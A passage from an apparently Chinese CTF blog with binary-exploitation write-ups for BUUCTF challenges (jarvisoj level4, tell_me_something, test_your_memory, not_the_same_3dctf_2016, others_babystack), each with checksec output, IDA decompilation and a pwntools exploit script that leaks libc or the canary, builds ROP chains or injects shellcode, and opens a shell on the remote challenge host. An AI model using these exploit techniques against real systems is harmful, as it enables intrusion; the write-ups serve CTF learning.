class="number">1</span>)+p32(libc_start_main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_start_real = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>,libc_start_real)</span><br><span class="line"></span><br><span class="line">libc_base = libc_start_real - libc.dump(<span class="string">&quot;__libc_start_main&quot;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc base=&gt;%s&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;system addr=&gt;%s&quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">log.info(<span class="string">&quot;binsh addr=&gt;%s&quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(sys_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="32-dynelf"><a class="markdownIt-Anchor" href="#32-dynelf"></a> <strong>3.2 Dynelf</strong></h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28393</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./level4&quot;</span>)</span><br><span class="line">vulner_function_address=<span class="number">0x804844B</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">bss_addr=<span class="number">0x0804a024</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">	payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x88</span>+<span class="string">&quot;aaaa&quot;</span>+p32(write_plt)+p32(vulner_function_address)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">	io.sendline(payload)</span><br><span class="line">	leak_sysaddr=io.recv(<span class="number">4</span>)</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (leak_sysaddr <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">	<span class="keyword">return</span> leak_sysaddr</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;./level4&quot;</span>))</span><br><span class="line">sys_addr=d.lookup(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;libc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(sys_addr)</span><br><span class="line">payload1=<span class="string">&quot;a&quot;</span>*<span class="number">0x88</span>+<span class="string">&quot;aaaa&quot;</span>+p32(read_plt)+p32(vulner_function_address)+p32(<span class="number">1</span>)+p32(bss_addr)+p32(<span class="number">8</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">payload2=<span class="string">&quot;a&quot;</span>*<span class="number">0x88</span>+<span class="string">&quot;aaaa&quot;</span>+p32(sys_addr)+p32(vulner_function_address)+p32(bss_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_level5"><a class="markdownIt-Anchor" href="#jarvisoj_level5"></a> jarvisoj_level5</h2>
<blockquote>
<p>buu上给的就是jarvisoj_level3_x64</p>
</blockquote>
<h2 id="jarvisoj_tell_me_something"><a class="markdownIt-Anchor" href="#jarvisoj_tell_me_something"></a> jarvisoj_tell_me_something</h2>
<h3 id="1checksec-55"><a class="markdownIt-Anchor" href="#1checksec-55"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-53"><a class="markdownIt-Anchor" href="#2ida-53"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input your message:\n&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;I have received your message, Thank you!\n&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>good_game</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">good_game</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+Fh] [rbp-9h]</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>自行读取flag，不嫌麻烦也可试试open/read/write</p>
</blockquote>
<h3 id="3exp-41"><a class="markdownIt-Anchor" href="#3exp-41"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29781</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./guestbook&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x0400620</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;message:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj_test_your_memory"><a class="markdownIt-Anchor" href="#jarvisoj_test_your_memory"></a> jarvisoj_test_your_memory</h2>
<h3 id="1checksec-56"><a class="markdownIt-Anchor" href="#1checksec-56"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-54"><a class="markdownIt-Anchor" href="#2ida-54"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">11</span>]; <span class="comment">// [esp+1Dh] [ebp-13h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">10</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n\n------Test Your Memory!-------\n&quot;</span>);</span><br><span class="line">  v3 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">    s2[i] = alphanum_2626[rand() % <span class="number">0x3E</span>u];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">  mem_test(s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//.rodata:08048860 alphanum_2626   db 30h                  ; DATA XREF: main+5F↑r</span></span><br><span class="line"><span class="comment">//.rodata:08048861 a123456789abcde db &#x27;123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;,0</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>产生随机数，然后让我们来猜</p>
</blockquote>
<p><strong>mem_test</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">mem_test</span><span class="params">(<span class="type">char</span> *s2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+15h] [ebp-13h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xB</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nwhat???? : &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x%x \n&quot;</span>, hint);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;cff flag go go go ...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, s2, <span class="number">4u</span>) )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;good job!!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;cff flag is failed!!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//.data:0804A040 hint            dd offset aCatFlag      ; DATA XREF: mem_test+2D↑r</span></span><br><span class="line"><span class="comment">//.data:0804A040 _data           ends                    ; &quot;cat flag&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>验证我们的输入，并且有了<strong>栈溢出</strong>和<strong>cat flag</strong>的地址</p>
</blockquote>
<p><strong>win_func</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">win_func</span><span class="params">(<span class="type">char</span> *command)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后门函数，作用==system</p>
<h3 id="3exp-42"><a class="markdownIt-Anchor" href="#3exp-42"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28178</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./memory&quot;</span>)</span><br><span class="line">cat_flag = <span class="number">0x80487e0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x13</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&quot;win_func&quot;</span>])+p32(cat_flag)</span><br><span class="line">payload += p32(cat_flag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="not_the_same_3dctf_2016"><a class="markdownIt-Anchor" href="#not_the_same_3dctf_2016"></a> not_the_same_3dctf_2016</h2>
<h3 id="1checksec-57"><a class="markdownIt-Anchor" href="#1checksec-57"></a> 1.checksec</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>
<h3 id="2ida-55"><a class="markdownIt-Anchor" href="#2ida-55"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+Fh] [ebp-2Dh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>简单栈溢出，但是远程开启了段保护，所以用ROP取消段保护</p>
</blockquote>
<h3 id="3exp-43"><a class="markdownIt-Anchor" href="#3exp-43"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28930</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line">payload+=p32(<span class="number">0x0809e3e5</span>)</span><br><span class="line">payload+=p32(<span class="number">0x080EB000</span>)</span><br><span class="line">payload+=p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload+=p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload+=p32(<span class="number">0x0809e3e5</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x080EBF80</span>)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="others_babystack"><a class="markdownIt-Anchor" href="#others_babystack"></a> others_babystack</h2>
<h3 id="1checksec-58"><a class="markdownIt-Anchor" href="#1checksec-58"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-56"><a class="markdownIt-Anchor" href="#2ida-56"></a> 2.IDA</h3>
<p><strong>两个主要功能</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Print</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = READ();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, &amp;s, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        PUTS(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    PUTS((<span class="type">const</span> <span class="type">char</span> *)&amp;unk_400AE7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>24行的<code>read</code>有一个短小的溢出，从这里我们使用19行的<code>puts</code>可以泄露<code>canary</code>的值，为之后更长的rop-chain做准备</p>
</blockquote>
<h3 id="3exp-44"><a class="markdownIt-Anchor" href="#3exp-44"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;babystack&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28311&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">text</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Print</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400a93</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main = <span class="number">0x0400908</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	store(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">	Print()</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">	canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;canary =&gt;0x%x&quot;</span>,canary)</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">	payload += p64(pop_rdi_ret)+p64(puts_got)</span><br><span class="line">	payload += p64(puts_plt)+p64(main)</span><br><span class="line">	store(payload)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line"></span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">	base = puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">	sys_addr = libc.dump(<span class="string">&quot;system&quot;</span>)+base</span><br><span class="line">	binsh = libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)+base	</span><br><span class="line">	log.success(<span class="string">&quot;puts real  =&gt;0x%x&quot;</span>,puts_addr)</span><br><span class="line">	log.success(<span class="string">&quot;libc base  =&gt;0x%x&quot;</span>,base)</span><br><span class="line">	log.success(<span class="string">&quot;system addr=&gt;0x%x&quot;</span>,sys_addr)</span><br><span class="line">	log.success(<span class="string">&quot;/bin/sh    =&gt;0x%x&quot;</span>,binsh)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">	payload += p64(pop_rdi_ret)+p64(binsh)</span><br><span class="line">	payload += p64(sys_addr)</span><br><span class="line">	store(payload)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="others_shellcode"><a class="markdownIt-Anchor" href="#others_shellcode"></a> others_shellcode</h2>
<blockquote>
<p>连上就有</p>
</blockquote>
